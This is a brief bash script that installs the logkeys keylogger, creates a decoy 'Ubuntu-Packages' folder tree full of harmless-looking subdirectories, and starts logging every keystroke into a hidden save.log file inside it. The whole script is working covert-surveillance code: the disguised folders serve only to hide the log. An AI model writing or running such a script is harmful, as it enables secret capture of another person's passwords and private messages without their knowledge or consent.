#!/bin/bash
sudo apt-get install logkeys
cd Downloads
mkdir Ubuntu-Packages
cd Ubuntu-Packages
mkdir config modules ext4 appdata dists pool indices project tmp srv dev usr
touch ls-lr.gz
cd ext4
touch save.log 
sudo logkeys --kill
sudo logkeys --start --output save.log
